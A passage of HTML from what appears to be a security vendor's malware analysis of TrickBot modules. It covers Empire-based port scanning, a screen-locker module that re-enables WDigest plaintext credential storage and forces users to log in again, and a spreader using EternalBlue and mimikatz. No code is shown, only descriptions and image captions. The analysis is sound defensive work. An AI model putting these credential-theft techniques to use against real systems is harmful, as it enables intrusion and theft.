https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-36.png?width=785&amp;name=triple-threat-blog-36.png 785w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-36.png?width=942&amp;name=triple-threat-blog-36.png 942w" sizes="(max-width: 314px) 100vw, 314px"></em></p>
<p style="text-align: center;"><em>The floating module responsible for the reconnaissance activity.</em></p>
<p>As mentioned, TrickBot also uses PowerShell Empire to perform reconnaissance and lateral movement. dll.dll is used to execute obfuscated PowerShell scripts in order to ultimately download and launch an Empire backdoor.</p>
<p>As part of its reconnaissance, TrickBot uses<a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/Invoke-Portscan.ps1" rel=" noopener"> Invoke-Portscan</a> to locate and detect valuable assets in the organization including domain controllers, file servers, and more. The collected data will be used to target assets and infect them with the Ryuk ransomware.&nbsp;</p>
<div><img src="https://lh4.googleusercontent.com/Jjwhd9252RMVB0fA_bgy_4ct6tfiTz9LRChwsQNOEB6hPJYXOjyTWO-WthNHR9DwOnBlELYo0C0L0dlI-jpDRb1g_3VySPff3q6uZmqEXwjQZxGhVIbMSAEh_xAtmG5hu8mPyIRV" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-37.png?width=409&amp;name=triple-threat-blog-37.png" alt="triple-threat-blog-37" width="409" loading="lazy" style="width: 409px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-37.png?width=205&amp;name=triple-threat-blog-37.png 205w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-37.png?width=409&amp;name=triple-threat-blog-37.png 409w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-37.png?width=614&amp;name=triple-threat-blog-37.png 614w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-37.png?width=818&amp;name=triple-threat-blog-37.png 818w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-37.png?width=1023&amp;name=triple-threat-blog-37.png 1023w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-37.png?width=1227&amp;name=triple-threat-blog-37.png 1227w" sizes="(max-width: 409px) 100vw, 409px"></em></p>
<p style="text-align: center;"><em>A visualization of the PowerShell empire process tree by the Cybereason Platform.</em></p>
<div><img src="https://lh6.googleusercontent.com/rCYnxzF4qtO79pJiQi0xnQZRw2jkdmYQLRheLKTSUzkIRhhsC05ia65QdOYOAy-A296oBmRPF86P2BdZpN1S3tL-5cVZKQF61PHYGUOLbTGTN6ZygyDHLt2qPW3-3Cky_Lh0H-LM" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-38.png?width=227&amp;name=triple-threat-blog-38.png" alt="triple-threat-blog-38" width="227" loading="lazy" style="width: 227px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-38.png?width=114&amp;name=triple-threat-blog-38.png 114w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-38.png?width=227&amp;name=triple-threat-blog-38.png 227w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-38.png?width=341&amp;name=triple-threat-blog-38.png 341w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-38.png?width=454&amp;name=triple-threat-blog-38.png 454w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-38.png?width=568&amp;name=triple-threat-blog-38.png 568w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-38.png?width=681&amp;name=triple-threat-blog-38.png 681w" sizes="(max-width: 227px) 100vw, 227px"></em></p>
<p style="text-align: center;"><em>The Top Port scan by the Cybereason Platform.</em>&nbsp;</p>
<h4>screenLocker_x64.dll</h4>
<p>screenLocker_x64.dll helps TrickBot with its reconnaissance and credential harvesting process. After being injected by TrickBot, svchost.exe was seen injecting into explorer.exe as well.</p>
<div>&nbsp;<img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-39.png?width=244&amp;name=triple-threat-blog-39.png" alt="triple-threat-blog-39" width="244" loading="lazy" style="width: 244px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-39.png?width=122&amp;name=triple-threat-blog-39.png 122w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-39.png?width=244&amp;name=triple-threat-blog-39.png 244w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-39.png?width=366&amp;name=triple-threat-blog-39.png 366w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-39.png?width=488&amp;name=triple-threat-blog-39.png 488w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-39.png?width=610&amp;name=triple-threat-blog-39.png 610w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-39.png?width=732&amp;name=triple-threat-blog-39.png 732w" sizes="(max-width: 244px) 100vw, 244px"></div>
<p style="text-align: center;"><em>svchost.exe injecting into explorer.exe.</em>&nbsp;</p>
<p>One of the modules loaded into explorer.exe is one of TrickBot’s very own modules: screenLocker_x64.dll.&nbsp;</p>
<div><img src="https://lh3.googleusercontent.com/lrVjXNCleawTgwmh8TpFeLKIgOl0NaLRTddfVsEAJ_xcMZjPFQKTfr-ARnOhADj1-C16Kyjx0y3Ivatq0mrstY_mxBm9aBgLbTJVjP2-fCdkwvlaBvO1yhZElg40J9i90MZkfgtX" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-40.png?width=295&amp;name=triple-threat-blog-40.png" alt="triple-threat-blog-40" width="295" loading="lazy" style="width: 295px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-40.png?width=148&amp;name=triple-threat-blog-40.png 148w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-40.png?width=295&amp;name=triple-threat-blog-40.png 295w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-40.png?width=443&amp;name=triple-threat-blog-40.png 443w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-40.png?width=590&amp;name=triple-threat-blog-40.png 590w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-40.png?width=738&amp;name=triple-threat-blog-40.png 738w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-40.png?width=885&amp;name=triple-threat-blog-40.png 885w" sizes="(max-width: 295px) 100vw, 295px"></p>
<p style="text-align: center;"><em>Evidence of the screenLocker module being loaded by explorer.exe.</em>&nbsp;</p>
<p>TrickBot uses a component of <a href="https://github.com/gentilkiwi/mimikatz" rel=" noopener">mimikatz</a> to extract credentials from the target system. It targets WDigest credentials stored in LSA memory in plain text. Microsoft introduced a way to mitigate this attack by adding a switch in the form of a registry entry, and has addressed this issue with <a href="https://blogs.technet.microsoft.com/srd/2014/06/05/an-overview-of-kb2871997/" rel=" noopener">KB2871997</a> and <a href="https://www.microsoft.com/en-us/download/details.aspx?id=42683" rel=" noopener">KB2928120</a>.</p>
<p>To disable the storage of WDigest credentials in memory, the registry entry value must be set to 0. In order to ensure the tool succeeds in obtaining user credentials, it verifies that the registry entry is enabled by setting it to 1.</p>
<p>However, to successfully collect credentials, the user will have to log into the system <em>after</em> the registry modification takes place so the credentials can be stored in memory. In order to ensure this takes place, the module starts a routine that locks the users screen so they must enter their login credentials to gain access to the system.&nbsp;</p>
<div><img src="https://lh4.googleusercontent.com/waUJlS0LzYax6k4P8FVF2J55MQptoCLLuUwoHqQUFSSloVaTZtEO5FrhlAXwANKmIBeyuilsdVVBC5rqRFEBEZaNW2QmLnqGd2i-VVC-6X7ZAofF6BMgbUFxHM6FHsNcErBirk0_" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-41.png?width=785&amp;name=triple-threat-blog-41.png" alt="triple-threat-blog-41" width="785" loading="lazy" style="width: 785px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-41.png?width=393&amp;name=triple-threat-blog-41.png 393w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-41.png?width=785&amp;name=triple-threat-blog-41.png 785w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-41.png?width=1178&amp;name=triple-threat-blog-41.png 1178w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-41.png?width=1570&amp;name=triple-threat-blog-41.png 1570w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-41.png?width=1963&amp;name=triple-threat-blog-41.png 1963w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-41.png?width=2355&amp;name=triple-threat-blog-41.png 2355w" sizes="(max-width: 785px) 100vw, 785px"></p>
<p style="text-align: center;"><em>The LockWorkStation function, which is in charge of locking the users screen.</em></p>
<p>A hard-coded registry entry inside the module called WDigest contains the credentials (<em>\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest\</em>).&nbsp;</p>
<div><img src="https://lh6.googleusercontent.com/_Zn9m_47UquWni4aOSRipYW-E0HDq7XH1VoTZBLASoSJ9wBiEKC3TXuS8RdZxo0pFxyF2MkRkc-FpoEt8KEGtMWxUjq63gCBrG2ZIK7OK7ohDLFSUtM-Vrx4Fok3cmf8718Bwr90" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-42.png?width=362&amp;name=triple-threat-blog-42.png" alt="triple-threat-blog-42" width="362" loading="lazy" style="width: 362px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-42.png?width=181&amp;name=triple-threat-blog-42.png 181w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-42.png?width=362&amp;name=triple-threat-blog-42.png 362w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-42.png?width=543&amp;name=triple-threat-blog-42.png 543w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-42.png?width=724&amp;name=triple-threat-blog-42.png 724w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-42.png?width=905&amp;name=triple-threat-blog-42.png 905w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-42.png?width=1086&amp;name=triple-threat-blog-42.png 1086w" sizes="(max-width: 362px) 100vw, 362px"></em></p>
<p style="text-align: center;"><em>The WDigest registry entry.</em></p>
<p>The module contains a list of Microsoft operating systems to compare to the operating system of the infected machine while working its role in TrickBot’s activity.&nbsp;</p>
<div><img src="https://lh4.googleusercontent.com/e-fBlI5itqI98GSj9QBATfZHZN277ejEN1umqzDm9gnDA90MQHeIiVYuaKGh-i5elqlVG9u-S0g967srSDPuhjIk6IcBJ0khuREHTcETb4V1922O1hGETUoRcFH4__eWWv5dSP8M" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-43.png?width=152&amp;name=triple-threat-blog-43.png" alt="triple-threat-blog-43" width="152" loading="lazy" style="width: 152px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-43.png?width=76&amp;name=triple-threat-blog-43.png 76w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-43.png?width=152&amp;name=triple-threat-blog-43.png 152w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-43.png?width=228&amp;name=triple-threat-blog-43.png 228w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-43.png?width=304&amp;name=triple-threat-blog-43.png 304w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-43.png?width=380&amp;name=triple-threat-blog-43.png 380w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-43.png?width=456&amp;name=triple-threat-blog-43.png 456w" sizes="(max-width: 152px) 100vw, 152px"></em></p>
<p style="text-align: center;"><em>A list of the operating systems inside the screen locker module.</em></p>
<p>The part in the module that is able to lock the workstation of an affected user is inside the files overlay. There is an indicator in the module that points to another file inside of it:&nbsp;</p>
<div><img src="https://lh5.googleusercontent.com/ti3jkJPEg5g-71pQ9eydd53cWo7AbHUZKT5dBvW7G_9JgDASTeJ8uuRBCO8uj8eGtKdNJOecbmgSZGSuQ8v7MVJzY2Y9OkSWm3xEOyyuFJK_nmeFY6d93vLaDPXxGxqwLyZMyUlj" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-44.png?width=620&amp;name=triple-threat-blog-44.png" alt="triple-threat-blog-44" width="620" loading="lazy" style="width: 620px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-44.png?width=310&amp;name=triple-threat-blog-44.png 310w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-44.png?width=620&amp;name=triple-threat-blog-44.png 620w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-44.png?width=930&amp;name=triple-threat-blog-44.png 930w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-44.png?width=1240&amp;name=triple-threat-blog-44.png 1240w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-44.png?width=1550&amp;name=triple-threat-blog-44.png 1550w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-44.png?width=1860&amp;name=triple-threat-blog-44.png 1860w" sizes="(max-width: 620px) 100vw, 620px"></em></p>
<p style="text-align: center;"><em>The overlay indicator.</em></p>
<p>By dumping the overlay of the module to a file and opening it in a hex editor, it’s possible to see that the overlay contains the WDigest registry entry, as well as the process the module will be injected into to fetch the users credentials (<em>explorer.exe</em>).&nbsp;</p>
<div><img src="https://lh6.googleusercontent.com/qTf9hqlcOozvQYw0FD36eNtKVxDNDbiEp_P4_TJlqaKGrVREd9_b5oX7TFkf_naBVKSDUsecPMEpZtgwe5r8B5p6XqL6n8H59C3fWeaEZly8Il04pPY8o7jPBwiIyrQS7ztpj7QN" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-45.png?width=608&amp;name=triple-threat-blog-45.png" alt="triple-threat-blog-45" width="608" loading="lazy" style="width: 608px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-45.png?width=304&amp;name=triple-threat-blog-45.png 304w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-45.png?width=608&amp;name=triple-threat-blog-45.png 608w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-45.png?width=912&amp;name=triple-threat-blog-45.png 912w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-45.png?width=1216&amp;name=triple-threat-blog-45.png 1216w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-45.png?width=1520&amp;name=triple-threat-blog-45.png 1520w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-45.png?width=1824&amp;name=triple-threat-blog-45.png 1824w" sizes="(max-width: 608px) 100vw, 608px"></em></p>
<p style="text-align: center;"><em>Contents of the dumped file opened in a hex editor.</em></p>
<div><img src="https://lh5.googleusercontent.com/FPKGPOwHpPBp9qNL0797mLFWwkqGPeRiinXxtdlee5RluLoVkcSvt58p5ciPc8W6xeIZwVwnuQgi_CF6tvUykjWph18W5OOqB4Cxw6tkUHSGBfTX61TlFWfOukWtLu6RDK3Ntr6r" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-46.png?width=511&amp;name=triple-threat-blog-46.png" alt="triple-threat-blog-46" width="511" loading="lazy" style="width: 511px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-46.png?width=256&amp;name=triple-threat-blog-46.png 256w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-46.png?width=511&amp;name=triple-threat-blog-46.png 511w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-46.png?width=767&amp;name=triple-threat-blog-46.png 767w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-46.png?width=1022&amp;name=triple-threat-blog-46.png 1022w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-46.png?width=1278&amp;name=triple-threat-blog-46.png 1278w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-46.png?width=1533&amp;name=triple-threat-blog-46.png 1533w" sizes="(max-width: 511px) 100vw, 511px"></p>
<p style="text-align: center;"><em>A full flow visualized in the Cybereason Platform of the screenLocker_x64.dll module and related injections.</em></p>
<h4>spreader_x64.dll</h4>
<p>spreader_x64.dll contains two of the main capabilities of TrickBot: spreading by exploiting the EternalBlue vulnerability, and using mimikatz to perform credential theft.</p>
<p>&nbsp;The Cybereason Platform identified lsass access (the mimikatz activity of dumping the memory of lsass.exe), floating executable code (the reflectively injected DLL spreader_x64.dll), and a high internal connection rate, which indicates that it is scanning in order to help spread.</p>
<div><img src="https://lh4.googleusercontent.com/zXkd9iHFGnluZo4oxYcD3Y6CpjRfnBNyRweZgTywVnDjtZmppQ4v-y4eF8CsatBkAyizmJqm63iPe1_FsafGwj1rQN-OgqWfBzDEU3GedeeAblVGPQKzoY3fZGgptKdz0iy4FvxE" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-47.png?width=378&amp;name=triple-threat-blog-47.png" alt="triple-threat-blog-47" width="378" loading="lazy" style="width: 378px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-47.png?width=189&amp;name=triple-threat-blog-47.png 189w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-47.png?width=378&amp;name=triple-threat-blog-47.png 378w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-47.png?width=567&amp;name=triple-threat-blog-47.png 567w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-47.png?width=756&amp;name=triple-threat-blog-47.png 756w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-47.png?width=945&amp;name=triple-threat-blog-47.png 945w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-47.png?width=1134&amp;name=triple-threat-blog-47.png 1134w" sizes="(max-width: 378px) 100vw, 378px"></em></p>
<p style="text-align: center;"><em>Evidence of the malicious activity perpetrated by Spreader_64.dll, shown by the Cybereason Platform.</em></p>
<p>spreader_x64.dll uses the EternalBlue vulnerability to spread via SMB (port 445).&nbsp;</p>
<div><img src="https://lh6.googleusercontent.com/iZOfCf8rEfdfXLwbPuU8gxtvEshDQig7H_-nAhuzndCdLFMJAiCRxBtndCHwgOFC-OzZN5mvD2iT3ByVg-lezaHcNoxcyG2wuw2aZiRaH2MOPQfc6b8pvHcQHvji7E-s41sgBpIU" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-48.png?width=668&amp;name=triple-threat-blog-48.png" alt="triple-threat-blog-48" width="668" loading="lazy" style="width: 668px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-48.png?width=334&amp;name=triple-threat-blog-48.png 334w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-48.png?width=668&amp;name=triple-threat-blog-48.png 668w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-48.png?width=1002&amp;name=triple-threat-blog-48.png 1002w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-48.png?width=1336&amp;name=triple-threat-blog-48.png 1336w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-48.png?width=1670&amp;name=triple-threat-blog-48.png 1670w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-48.png?width=2004&amp;name=triple-threat-blog-48.png 2004w" sizes="(max-width: 668px) 100vw, 668px"></em></p>
<p style="text-align: center;"><em>A Cybereason Platform visualization of the connection via port 445 as part of EternalBlue.</em>&nbsp;</p>
<div><img src="https://lh4.googleusercontent.com/v6ZYRuuQD0vwinzBbF5Qg50OCCOtKVjdSo7XlRrcQklvaF0p4iX0QoD70aGSd5spo29LQ_v3OHA4QHQCrwFhztc6NuLU7ys0xAYYzHVu6jNyJSo5QPFdYhhq793IYxVm_S3hHgu4" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-49.png?width=1073&amp;name=triple-threat-blog-49.png" alt="triple-threat-blog-49" width="1073" loading="lazy" style="width: 1073px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-49.png?width=537&amp;name=triple-threat-blog-49.png 537w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-49.png?width=1073&amp;name=triple-threat-blog-49.png 1073w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-49.png?width=1610&amp;name=triple-threat-blog-49.png 1610w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-49.png?width=2146&amp;name=triple-threat-blog-49.png 2146w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-49.png?width=2683&amp;name=triple-threat-blog-49.png 2683w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-49.png?width=3219&amp;name=triple-threat-blog-49.png 3219w" sizes="(max-width: 1073px) 100vw, 1073px"></em></p>
<p style="text-align: center;"><em>EternalBlue strings in the spreader_x64.dll binary.</em></p>
<p>spreader_x64.dll also contains the mimikatz binary. When executed, it dumps credentials by opening a command prompt window and run mimikatz.</p>
<p>&nbsp;PwDumper_x64.dll is also reflectively injected into the svchost process in order to perform the dumping.</p>
<div><img src="https://lh3.googleusercontent.com/KBL9xdS0kan8MxmvyiER0Fwo0DQMT1rTXBGD0FBCqXkGCs5uRPVUNdhMLBfRbxhP2rHDIZpXUtBS02QfhQ-vuZNS7qXJRll30t8YNLJC1TE4Db_dvcMGj-5ec7oyDN6L1Sze5t4S" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-50.png?width=280&amp;name=triple-threat-blog-50.png" alt="triple-threat-blog-50" width="280" loading="lazy" style="width: 280px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-50.png?width=140&amp;name=triple-threat-blog-50.png 140w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-50.png?width=280&amp;name=triple-threat-blog-50.png 280w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-50.png?width=420&amp;name=triple-threat-blog-50.png 420w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-50.png?width=560&amp;name=triple-threat-blog-50.png 560w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-50.png?width=700&amp;name=triple-threat-blog-50.png 700w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-50.png?width=840&amp;name=triple-threat-blog-50.png 840w" sizes="(max-width: 280px) 100vw, 280px"></em></p>
<p style="text-align: center;"><em>PwDumper_x64.dll reflectively loaded into svchost.exe.</em>&nbsp;</p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-51.png?width=548&amp;name=triple-threat-blog-51.png" alt="triple-threat-blog-51" width="548" loading="lazy" style="width: 548px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-51.png?width=274&amp;name=triple-threat-blog-51.png 274w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-51.png?width=548&amp;name=triple-threat-blog-51.png 548w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-51.png?width=822&amp;name=triple-threat-blog-51.png 822w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-51.png?width=1096&amp;name=triple-threat-blog-51.png 1096w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-51.png?width=1370&amp;name=triple-threat-blog-51.png 1370w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-51.png?width=1644&amp;name=triple-threat-blog-51.png 1644w" sizes="(max-width: 548px) 100vw, 548px"><img src="https://lh6.googleusercontent.com/86SkwAHqHaeCgkh74EKiBmRZHKY1AYM3BgnLel8CNtqA7NkujhbLC5DxF03KTh4q2g0xwJ1m7cMAEUdOaUJ9xwg35kdCe3SdEllNAQnX6iQbSt-DZF372IWcVAVlR4IFtg7wgB_z" alt="" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;">&nbsp;<em>mimikatz strings in the spreader_x64.dll binary.</em></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-52.png?width=623&amp;name=triple-threat-blog-52.png" alt="triple-threat-blog-52" width="623" loading="lazy" style="width: 623px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-52.png?width=312&amp;name=triple-threat-blog-52.png 312w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-52.png?width=623&amp;name=triple-threat-blog-52.png 623w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-52.png?width=935&amp;name=triple-threat-blog-52.png 935w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-52.png?width=1246&amp;name=triple-threat-blog-52.png 1246w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-52.png?width=1558&amp;name=triple-threat-blog-52.png 1558w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-52.png?width=1869&amp;name=triple-threat-blog-52.png 1869w" sizes="(max-width: 623px) 100vw, 623px"></em><img src="https://lh5.googleusercontent.com/NL5jKZ-iPV1hjXRXBdYQCWVYzuuBzGQFN6WzgxLklJHmXPhUAYaRWiz97e5oM4NDZWClsMFkSrhC_InWZ9m0FkHs1IPG-cVV52weFnhTEaH0b28N_jxcsoG1P7-cDYeGi--eIZDM" alt="" style="display: block; margin-left: auto; margin-right: auto;"></p>
